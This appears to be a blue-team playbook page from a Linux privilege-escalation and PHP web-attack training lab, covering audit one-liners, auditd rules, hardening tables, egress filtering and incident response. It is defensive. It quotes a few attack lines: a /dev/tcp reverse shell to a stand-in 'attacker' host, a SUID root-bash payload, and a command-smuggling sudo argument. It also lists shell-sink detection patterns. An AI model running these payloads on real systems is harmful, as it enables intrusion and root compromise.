# Blue-Team Playbook

You have worked all five chapters as the attacker. This page flips the chair around. Every technique in [[Chapter-01-Overview]], [[Chapter-02-Overview]], [[Chapter-03-Overview]], and [[Chapter-04-Overview]] has a mirror-image defence, and almost all of the **privesc** ones boil down to the same three habits: **inventory what root touches, lock down the perms on those things, and watch for writes you did not authorise.**

[[Chapter-09-Overview]] is the odd one out: it is the *perimeter*, not privesc. There the attacker starts outside with a browser, so the defence is a different discipline — **validate and encode everything that crosses a trust boundary, and keep the web user boxed in.** Section 7 covers it.

This page is the daily checklist, and it is where every station page sends you for the detect-and-fix recipe. Read it top-to-bottom the first time, then keep it open as a reference.

---

## 1. The mindset: "root trusts a user-writable thing"

Across all twenty stations, the bug is never "a user has too many privileges." The user stays a normal user. The bug is always that **root — or a program running as root — reads, sources, imports, execs, archives, or inherits its PATH and environment from something a non-root user can write.**

Make that one sentence your mental grep:

| Chapter | What root does | What it trusts | The bug |
|---------|---------------|----------------|---------|
| 01 Station A | runs a SUID copy of `find` | the `-exec` argument you pass | SUID on a general-purpose tool |
| 01 Station B | runs a SUID `python3` | your stdin / `-c` argument | SUID on an interpreter |
| 01 Station C | SUID binary `system("du ...")` | `$PATH` from your shell | bare command in a privileged call |
| 01 Station D | SUID binary `system("/bin/cat /var/log/" + arg)` | the argument string | unsanitised shell input |
| 01 Station E | SUID binary `dlopen` via RPATH/RUNPATH | a 0777 directory | writable library search path |
| 02 Station A | cron runs `rotate.sh` | the script file (0777) | writable cron script |
| 02 Station B | cron runs `backup-run.sh` which `source`s a config | the config file (0666) | writable sourced file |
| 02 Station C | cron runs every `*.sh` in `/opt/jobs` | the directory (0777) | writable drop dir |
| 02 Station D | cron runs `df` by bare name | a dir first on cron's `$PATH` | writable `PATH` component |
| 02 Station E | cron runs `tar czf ... *` in `/opt/data` | the filenames in that dir | wildcard argument injection |
| 03 Station A | runs `find` under `sudo NOPASSWD` | the `-exec` argument you pass | `NOPASSWD` on a GTFOBins binary |
| 03 Station B | runs `/opt/admin/backup.sh` under `sudo` | the script file (0777) | writable sudo-run script |
| 03 Station C | runs `rtr-health` under `sudo`, keeps `LD_PRELOAD` | a `.so` you point it at | `env_keep` leaks `LD_PRELOAD` |
| 03 Station D | `sudo cat /var/log/app/*.log` | the filenames the glob expands | wildcard rule + writable log dir |
| 03 Station E | `eval`s `$NAME` in a sudo'd script | the argument string | `eval` on argv + trailing `*` in the rule |
| 04 Station A | *(reuses 01 Station C)* | `$PATH` from your shell | bare command + writable PATH dir — see 01-C |
| 04 Station B | *(reuses 02 Station D)* | cron's `$PATH` | cron PATH component writable — see 02-D |
| 04 Station C | `disk-check.sh` runs `df` by bare name under `sudo` | a 0777 dir first on PATH | sudo wrapper prepends a writable dir |
| 04 Station D | `rtr-disk.service` runs `df` by bare name | `/opt/svc/bin` (0777) first on the unit's PATH | writable dir in `Environment=PATH=` |
| 04 Station E | a root login job sources `/etc/environment`, runs `uname` | `/etc/environment` (0666) | world-writable `/etc/environment` |

If you remember nothing else: **ask "who can write the thing root trusts here?" and keep asking it until you get to a root-only answer.** When the answer is "anyone," you have a finding.

---

## 2. Daily audit one-liners (what every flag means)

Run these on any Linux box you own. They cost nothing, and they catch every bug class the labs teach.

### 2a. SUID baseline

```bash
find / -perm -4000 -type f 2>/dev/null
```

Flag-by-flag:

- `/` — start at the root of the filesystem; walk everything.
- `-perm -4000` — files whose permission bits **contain** the SUID bit (octal `4000`). The leading dash means "has at least these bits set," rather than "exactly these bits." Drop the dash and you'd miss `-rwsr-xr-x` because its bits are really `4755`.
- `-type f` — regular files only. Skips directories and symlinks, so you don't get noise.
- `2>/dev/null` — send permission-denied errors to the bin. You will walk into directories your user cannot read; that is expected, and the noise would drown the signal otherwise.

Pipe to `sort > /tmp/suid.baseline` the first time, then re-run weekly and `diff` against that file. **Anything new under `/usr/local/bin` or `/opt`, especially a copy of a system tool like `find`, `python3`, `vim`, `nmap`, or `tar`, is a red flag** — those are the classic GTFOBins.

### 2b. World-writable files and dirs

```bash
find / -perm -0002 -type f 2>/dev/null
find / -type d -perm -0002 2>/dev/null
```

- `-perm -0002` — the "other-write" bit (the trailing `2` in `0777`'s last digit). This is what makes a file writable by anyone, not just the owner or group. The lab's five cron bugs all fall out of these two commands: `/opt/maint/rotate.sh`, `/etc/rtr/backup.conf`, `/opt/jobs`, `/opt/maint/bin`, and `/opt/data` all show up.

### 2c. Writable things root's cron reaches for

```bash
find /etc/cron* /opt /usr/local -perm -o+w 2>/dev/null
```

- `/etc/cron* /opt /usr/local` — three roots cron jobs commonly live under. `/etc/cron.d`, `/etc/cron.daily`, `/etc/cron.hourly`, `/opt/<app>`, `/usr/local/sbin`.
- `-perm -o+w` — same test as `-perm -0002`, written symbolically. "The other-user class has the write bit." Clearer to read when a second human is on your shoulder.

### 2d. Scripts that `source` another file

```bash
grep -rE "^\s*(\. |source )" /etc/cron* /usr/local/sbin
```

- `grep -r` — recurse into every file under each directory.
- `-E` — extended regex, so we can use `|` inside the pattern.
- `^\s*` — line starts with any amount of whitespace.
- `(\. |source )` — either a literal dot followed by a space (the POSIX `source` shorthand), or the word `source` followed by a space. These are the two ways a shell script loads another file into its own context, and both are Station B of Chapter 02.

For every hit, open the target file and confirm it is `0644 root:root`. If a root-run script `source`s a `0666` config, that config is as privileged as the script.

### 2e. Cron entries with their own `PATH=` line

```bash
grep -rE '^PATH=' /etc/crontab /etc/cron.d 2>/dev/null
```

Station D of Chapter 02 is this exact bug: `PATH=/opt/maint/bin:/usr/bin:/bin` with a world-writable first entry. For every `PATH=` you find, walk the directories in order and confirm **each one is root-owned and `0755` or stricter**. The first one matters the most — the shell searches left-to-right and stops on the first match.

### 2f. sudoers audit (Chapter 03)

Start with what you are allowed to run:

```bash
sudo -l
```

Read the output the way an attacker does. Three things are findings on sight:

- a `NOPASSWD` entry on any binary GTFOBins knows a shell escape for — `find`, `vim`, `less`, `awk`, `python3`, `tar`, and dozens more (Station A);
- any script you may run that is not root-owned and locked down — if you can write it, `sudo`-running it is a root shell (Station B);
- an `env_keep` or a wildcard in the options (see below).

Then the file perms and the rule contents:

```bash
ls -la /etc/sudoers.d/
grep -rE 'NOPASSWD|env_keep|\*' /etc/sudoers /etc/sudoers.d
```

- `ls -la /etc/sudoers.d/` — **every file here must be `0440 root:root`.** `visudo -c` flags the wrong perms, but a line of `ls -la` reads faster.
- `NOPASSWD` — skips the password prompt; on a shell-escapable binary that is instant root (Station A).
- `env_keep` — tells sudo to pass a variable through instead of scrubbing it. `env_keep += "LD_PRELOAD"` (Station C) loads your own `.so` into a root process; any `LD_*` kept here is the same bug. (A sane constructor must `unsetenv("LD_PRELOAD")` before it does anything, or every child it spawns re-triggers the preload — that is the detail that turns a careless PoC into a fork bomb.)
- `\*` — a literal asterisk in the rule. A wildcard in a path argument (`cat /var/log/app/*.log`, Station D) lets you aim the glob at a symlink to `/root/flag.txt`; a trailing `*` that swallows extra argv (Station E) lets `sudo add-contact.sh 'x; /bin/bash'` smuggle a command into an `eval`.

For every script named in `sudo -l`, confirm it is root-owned and not writable by you, then validate the whole config:

```bash
ls -l /opt/admin/backup.sh /opt/admin/add-contact.sh
visudo -c
```

`visudo -c` checks syntax and perms across every sudoers file at once. A `0777` script here, or a rule that `eval`s its argument, is Chapter 03 in one line.

### 2g. PATH, systemd units, and /etc/environment (Chapter 04)

Chapter 04 is Station 01-C and 02-D generalised: a privileged caller runs a command by **bare name**, and you control a directory that comes first on its `PATH`. Audit the PATH of every privileged caller, not just your own:

```bash
echo "$PATH"
sudo -l | grep -i secure_path
```

- `echo "$PATH"` — for each directory, confirm it is root-owned and `0755` or stricter. A world-writable dir anywhere lets you shadow a bare command; first on the list is worst. Station C hides a `0777` `/opt/admin/bin` at the front of a sudo wrapper's PATH.
- `secure_path` — the PATH sudo forces for the commands it runs. It should list only root-owned dirs (`/usr/sbin:/usr/bin:/sbin:/bin`, plus `/snap/bin` on Ubuntu). If it is missing, sudo'd scripts inherit *your* PATH and Station C needs no writable dir of its own.

Then the two places a root job picks up a PATH you did not set — a systemd unit and `/etc/environment`:

```bash
systemctl show -p Environment rtr-disk.service
grep -rn 'Environment=PATH=' /etc/systemd/system /lib/systemd/system /run/systemd/system
ls -l /etc/environment
```

- `systemctl show -p Environment <unit>` / the `grep` — a unit that sets its own `Environment=PATH=` with a writable dir first (Station D) hijacks every bare command the service runs, and it fires on a timer, so it re-triggers every ~20s. Walk each dir in the value; the first must be root-owned `0755`.
- `ls -l /etc/environment` — **must be `0644 root:root`.** PAM reads it at login for every user including root; at `0666` (Station E) anyone can prepend a PATH entry that a root login-style job then inherits before it calls `uname`.

---

## 3. Monitoring with auditd

The audits above tell you what a box looks like **now**. auditd tells you **when it changed**. Install `auditd` (`apt install auditd`), then add the following rules to `/etc/audit/rules.d/rtr-defence.rules`:

```text
-w /etc/cron.d        -p wa -k cron_edit
-w /etc/crontab       -p wa -k cron_edit
-w /etc/sudoers       -p wa -k sudo_edit
-w /etc/sudoers.d     -p wa -k sudo_edit
-w /etc/passwd        -p wa -k passwd_edit
-w /usr/local/sbin    -p wa -k script_edit
-w /usr/local/bin     -p wa -k script_edit
-w /opt/maint         -p wa -k script_edit
-w /opt/jobs          -p wa -k script_edit
-w /opt/data          -p wa -k script_edit
-w /opt/admin         -p wa -k script_edit
-w /opt/svc/bin       -p wa -k script_edit
-w /etc/rtr           -p wa -k config_edit
-w /var/log/app       -p wa -k config_edit
-w /etc/environment   -p wa -k env_edit
-w /etc/systemd/system -p wa -k unit_edit
-w /lib/systemd/system -p wa -k unit_edit
```

Flag-by-flag:

- `-w <path>` — watch this inode (or every file inside, for a directory).
- `-p wa` — alert on **w**rite and **a**ttribute change (chmod, chown). Skip `r` (reads happen constantly) and `x` (we have other ways to catch exec).
- `-k <key>` — a label; use it later with `ausearch -k cron_edit` to pull every event tagged this way. Pick labels that group related rules.

Load the rules with `augenrules --load`, confirm they are active with `auditctl -l`, and from then on, every write to a cron entry, sudoers rule, systemd unit, `/etc/environment`, or privileged script directory shows up in `/var/log/audit/audit.log`. Ship those logs off-host. A box you cannot read after compromise is a box you cannot defend.

To also catch the payloads from the writeups — `cp /bin/bash /tmp/rootbash` followed by `chmod 6777` — add a syscall rule:

```text
-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F a1&04000 -k setuid_bit_set
```

Flag-by-flag:

- `-a always,exit` — fire on every matching syscall, when it exits.
- `-F arch=b64` — only the 64-bit ABI (add a second line with `arch=b32` if your box runs 32-bit code).
- `-S chmod,fchmod,fchmodat` — the three ways a process sets a file's mode.
- `-F a1&04000` — the mode argument has the SUID bit set (`04000` in octal, bitwise-anded against the second syscall argument).
- `-k setuid_bit_set` — label it.

You will get a handful of hits a day on a normal server, most of them from package installs. Everything else deserves a look.

---

## 4. Hardening checklist

If you are building a server, or auditing one before go-live, every path type below has exactly one correct answer. Deviations are findings.

| Path type | Target perms | Owner | Why |
|-----------|-------------|-------|-----|
| Cron entry file (`/etc/cron.d/*`) | `0644` | `root:root` | Everyone reads, only root writes |
| Script root executes (via cron, SUID, or sudo) | `0755` (or `0700` for internals) | `root:root` | Prevents Station A appends |
| Config file a root script `source`s or reads | `0644` | `root:root` | Prevents Station B appends |
| Drop directory a root loop iterates | `0755` | `root:root` | Prevents Station C planting |
| Each directory on a privileged `PATH=` | `0755` | `root:root` | Prevents Station D hijack |
| Data directory a root wildcard expands | `0755` | `root:root` (or run tar as a service user) | Prevents Station E argument injection |
| `/etc/sudoers.d/*` | `0440` | `root:root` | sudo refuses to read anything looser |
| Script named in a sudoers rule | `0755` (never writable by non-root) | `root:root` | Prevents Station 03-B overwrite |
| Binary named in a sudoers rule | n/a — must have no shell escape | `root:root` | A GTFOBins binary under `NOPASSWD` is Station 03-A |
| `systemd` unit file (+ each dir on its `Environment=PATH=`) | unit `0644`; each PATH dir `0755` | `root:root` | Prevents Station 04-D hijack |
| `/etc/environment` | `0644` | `root:root` | Prevents Station 04-E injection |
| SUID binaries | `4755` | `root:root`, **only for binaries that genuinely need it** | Audit the list weekly |

Five extra rules that cover the gaps the table does not:

1. **Never `chmod +s` a general-purpose tool.** `find`, `vim`, `cp`, `tar`, `nmap`, `python3`, `perl`, `ruby`, `node`, `bash`. If you catch yourself typing it, you are building Station A or B.
2. **Mount user-writable filesystems `nosuid`.** `/home`, `/tmp`, `/var/tmp`. A SUID binary planted on a `nosuid` filesystem does nothing.
3. **Call externals by absolute path inside privileged scripts and binaries.** `/usr/bin/df`, not `df`. Also set `PATH=/usr/sbin:/usr/bin:/sbin:/bin` as the first non-comment line.
4. **Keep sudo's defaults, and keep sudo rules narrow.** Leave `env_reset` on; never `env_keep` `LD_PRELOAD`, `LD_LIBRARY_PATH`, or any `LD_*`. Grant `NOPASSWD` only on single-purpose binaries with no shell escape, and only on scripts you can lock to `root:root` and non-writable. No wildcards in path arguments, no trailing `*` in the rule, and validate argv inside the script — never `eval` it.
5. **Pin PATH for everything root runs.** Reset `PATH=/usr/sbin:/usr/bin:/sbin:/bin` at the top of every privileged script, set `secure_path` in sudoers, give every systemd unit an explicit root-owned `Environment=PATH=`, and keep `/etc/environment` `0644 root:root`.

---

## 5. What good looks like

Final state for the Chapter 01 host (`hollow-fileproc-01`) after hardening:

| Path | Before (vulnerable) | After (hardened) |
|------|---------------------|------------------|
| `/usr/local/bin/suid-find` | `4755 root:root` (SUID set) | removed (or `0755 root:root`) |
| `/usr/local/bin/suid-python` | `4755 root:root` (SUID set) | removed (or `0755 root:root`) |
| `/usr/local/bin/logstats` | `4755 root:root` | `0755 root:root`, source patched to use `/usr/bin/du` |
| `/usr/local/bin/logreader` | `4755 root:root` | `0755 root:root`, source patched to validate input |
| `/usr/local/bin/report` | `4755 root:root` | `0755 root:root`, RPATH/RUNPATH removed or pointed at `/usr/lib` (Ubuntu 24.04 emits `DT_RUNPATH`) |
| `/opt/lab/lib` | `0777` | `0755 root:root` |

Final state for the Chapter 02 host (`hollow-backup-01`):

| Path | Before (vulnerable) | After (hardened) |
|------|---------------------|------------------|
| `/opt/maint/rotate.sh` | `0777 root:root` | `0755 root:root` |
| `/etc/rtr/backup.conf` | `0666 root:root` | `0644 root:root` (and the script should parse, not `source`) |
| `/opt/jobs` | `0777 root:root` | `0755 root:root` |
| `/opt/maint/bin` | `0777 root:root` | `0755 root:root` (or remove the `PATH=` line entirely) |
| `/opt/data` | `0777 root:root` | `0755 root:root`, and `archive.sh` runs as a non-root service user with `tar -C /opt/data .` |

Final state for the Chapter 03 host (`hollow-dmz-01`):

| Path / rule | Before (vulnerable) | After (hardened) |
|------|---------------------|------------------|
| sudoers rule for `/usr/bin/find` | `NOPASSWD: /usr/bin/find` | removed — no GTFOBins binary under sudo |
| `/opt/admin/backup.sh` | `0777`, run via `NOPASSWD` | `0755 root:root` (or the rule removed) |
| sudoers `env_keep` | `env_keep += "LD_PRELOAD"` | removed; `env_reset` only |
| `/var/log/app` + log rule | `0777`, rule `cat /var/log/app/*.log` | `0750 root:adm`, rule names exact files (no glob) |
| `/opt/admin/add-contact.sh` | `eval "echo Added: $NAME"`, rule ends in `*` | argv validated (no `eval`), trailing `*` removed |

Final state for the Chapter 04 host (`hollow-ops-01`):

| Path | Before (vulnerable) | After (hardened) |
|------|---------------------|------------------|
| `/opt/admin/bin` (first on `disk-check.sh`'s PATH) | `0777`, first on PATH | dropped from PATH; script resets PATH and calls `/usr/bin/df` |
| `rtr-disk.service` `Environment=PATH=` | `/opt/svc/bin:...` with `/opt/svc/bin` `0777` first | `/opt/svc/bin` `0755 root:root` (or removed); unit calls `/usr/bin/df` |
| `/etc/environment` | `0666 root:root` | `0644 root:root` |

If an `ls -la` of these paths looks like the "after" column, every attack from all four chapters stops at step one.

---

## 6. The web perimeter — initial access (Chapter 09)

Chapters 01–04 assume the attacker is already inside. [[Chapter-09-Overview]] is how they *get* inside: six bugs in the "Hollow Share" PHP app, each ending in a reverse shell as `www-data`, then `sudo php` to root. The defence is a different muscle — **treat every byte of user input as hostile until validated, and box the web user in** — but it closes the whole chapter at the perimeter.

### 6a. The one rule per route

| Route | Root cause | The fix that kills it |
|-------|-----------|-----------------------|
| A Unrestricted upload | file saved into a code-executing webroot dir | store uploads **outside** the docroot; serve as attachments; no PHP engine on the upload path |
| B Upload filter bypass | deny-list + client `Content-Type` | **allow-list** `jpg/png/gif`, **re-encode** the image, random server-chosen name; `AllowOverride None`; drop `AddHandler` |
| C Command injection | user input concatenated into a shell | don't shell out; pass **argv arrays** (`proc_open([...])`); strict input validation |
| D LFI → RCE | `include()` of user input | **allow-list** page names; `allow_url_include=Off`, `allow_url_fopen=Off`; tight `open_basedir`; `0640` logs in a `0750` dir |
| E SSTI (Twig) | user input compiled as a template | pass input as a **render variable**, never build template source; `SandboxExtension` if dynamic templates are unavoidable |
| F Insecure deserialization | `unserialize()` of a cookie | use `json_decode`; if not, `unserialize($d,['allowed_classes'=>[...]])` + HMAC-sign the blob |
| ★ Capstone | web user may `sudo php` | never grant the web user `sudo` on an interpreter; one argument-validated root wrapper, or a queue + service account |

### 6b. Upload hardening (Routes A & B)

The three habits that make an uploader safe, in order of importance:

1. **Store outside the document root.** `/var/lib/hollow/uploads`, never `/var/www/html/...`. Serve files back through a script that sets `Content-Disposition: attachment` and a fixed `Content-Type` — the web server must never be asked to *execute* an upload.
2. **No code execution on the upload path.** If it must live under the docroot, disable PHP there:
   ```apache
   <Directory /var/www/html/uploads>
       php_admin_flag engine Off
       AllowOverride None
       <FilesMatch "\.(?i:ph(p[0-9]?|tml|ar|ps|t))$">
           Require all denied
       </FilesMatch>
   </Directory>
   ```
   and mount the upload filesystem `noexec` where you can.
3. **Allow-list and re-encode.** Accept exactly the extensions you mean, verify the magic bytes *and* re-encode the image server-side (GD/Imagick) — re-encoding strips an embedded `<?php` payload. Assign a random server-chosen filename and extension; never trust the client's name, extension, or `Content-Type`.

### 6c. Input validation and no-shell exec (Routes C, D, E, F)

- **Never hand user input to a shell.** Use library calls, or `proc_open`/`pcntl_exec` with an **argument array** so there is no `/bin/sh -c` to re-parse. If you truly must build a string, `escapeshellarg()` every piece — but argv arrays are safer.
- **Never `include`/`require` user input.** Map a parameter to an allow-list of known files and include only the resolved value.
- **Never compile user input as a template.** Render templates with user input as *data* (`render('t.twig', ['name'=>$name])`).
- **Never `unserialize()` untrusted bytes.** Prefer `json_decode`; otherwise pass `allowed_classes` and sign the payload.
- Validate on a **positive** model (what is allowed), reject everything else, and encode on output.

### 6d. Defence in depth — `disable_functions` and friends

Make a webshell useless even if one slips in. In `php.ini`:

```ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec,proc_nice,dl
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html:/var/lib/hollow/uploads:/tmp
expose_php = Off
display_errors = Off          ; (this lab leaves it On to help learners)
```

Run PHP under **php-fpm as a dedicated low-privilege user** (not a shared `www-data` that can `sudo`), with `ProtectSystem=strict`/`NoNewPrivileges=true` on the systemd unit. A webshell that can't call `system()` and can't read outside `open_basedir` is a dead end.

### 6e. Kill the reverse shell with egress filtering

Every route in Chapter 09 ends with the box dialling **out** to the attacker. Web and app servers almost never need to open arbitrary outbound connections — so deny them:

```bash
# default-deny egress; allow only what the app legitimately needs (DNS, your DB, updates)
iptables -A OUTPUT -m owner --uid-owner www-data -p tcp --dport 53 -j ACCEPT
iptables -A OUTPUT -m owner --uid-owner www-data -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -m owner --uid-owner www-data -d <db-host> -p tcp --dport 5432 -j ACCEPT
iptables -A OUTPUT -m owner --uid-owner www-data -j REJECT
```

With outbound locked down, `bash -i >& /dev/tcp/attacker/4444` connects to nothing. Pair it with egress monitoring: a web user making an outbound TCP connection to a random high port is an incident.

### 6f. Detection one-liners

```bash
# webshells: PHP that calls a dangerous sink, anywhere in the webroot
grep -rlnE '\b(system|exec|shell_exec|passthru|eval|assert)\s*\(' /var/www

# freshly written scripts under the webroot (last 60 min)
find /var/www -mmin -60 -type f \( -name '*.php' -o -name '*.pht*' -o -name '*.phar' \)

# log poisoning in progress: PHP tags in the access log
grep -F '<?php' /var/log/apache2/access.log

# an uploaded .htaccess (Route B) — never legitimate in an upload dir
find /var/www -name '.htaccess' -newermt '-1 day'

# the capstone grant
grep -rE 'NOPASSWD' /etc/sudoers /etc/sudoers.d        # www-data on php/python/perl = finding
```

Feed these into auditd (section 3) with a watch on the webroot and upload dirs (`-w /var/www -p wa -k web_write`), and ship the logs off-host.

---

## 7. Incident response: the `/tmp/rootbash` canary

The cron chapter (02) and the PATH chapter (04) both end with the same payload — a privileged job the attacker steered runs `cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash` (some writeups shorten the name to `/tmp/rb`). The sudo chapter (03) usually drops you straight into an interactive root shell, but the same canary turns up wherever the exploit is a background job rather than a live session. That artefact is distinctive — a SUID root copy of bash anywhere under `/tmp` has no legitimate use case. If you see one, assume privilege compromise and work this checklist:

1. **Freeze, don't kill.** `ls -la /tmp/rootbash /tmp/rb` and screenshot it. Do not `rm` it yet — you need its mtime and ownership for timeline.
2. **Who put it there?** `stat /tmp/rootbash` gives you `Modify` and `Change` timestamps. Correlate with `/var/log/syslog`, `/var/log/auth.log`, and `/var/log/cron` inside a ten-minute window around that time:

   ```bash
   C=$(ls /tmp/rootbash /tmp/rb 2>/dev/null | head -1)
   T=$(stat -c %y "$C" | cut -c1-16)
   grep -F "$T" /var/log/syslog /var/log/auth.log /var/log/cron
   ```

   Flag-by-flag: the first line picks whichever canary name exists; `stat -c %y` prints its modify time; `cut -c1-16` keeps `YYYY-MM-DD HH:MM`; `grep -F` does a literal (not regex) string match so the date's special characters cause no surprises.

3. **Who ran it since?** `last` and `w` show logged-in users. `ps -eo pid,user,euser,cmd` lists processes whose **effective** user differs from their real user — a shell running as root from a non-root parent is suspicious.
4. **What else changed?** Pull every file modified within an hour of the canary:

   ```bash
   find / -mmin -60 -type f 2>/dev/null
   ```

   `-mmin -60` is "modified within the last 60 minutes" — negative means "less than," positive means "more than." Look at everything under `/etc/cron*`, `/etc/sudoers.d/`, `/usr/local/sbin`, and the user's home directory.
5. **Review auditd.** `ausearch -k cron_edit -ts recent`, `ausearch -k script_edit -ts recent`, `ausearch -k setuid_bit_set -ts recent`. These are the keys you set up in section 3 — now they earn their keep.
6. **Rotate secrets and rebuild.** SSH host keys, any secret in `/etc` or `/root`, any API token the box held. A rooted box is not patched — it is replaced. In the lab that is one `docker compose up -d --build --force-recreate <target>` (`target-suid`, `target-cron`, `target-sudo`, or `target-path`); in production it is a reinstall from trusted media.

For the deeper "why" on any station, go back to [[Chapter-01-Overview]], [[Chapter-02-Overview]], [[Chapter-03-Overview]], [[Chapter-04-Overview]], or [[Chapter-09-Overview]]. For the quick-reference primitive tables, see [[SUID-Privesc-Reference]], [[Cron-Privesc-Reference]], and [[Reverse-Shell-Reference]]. If a term in this page is new, [[Glossary]] has the one-line definition.
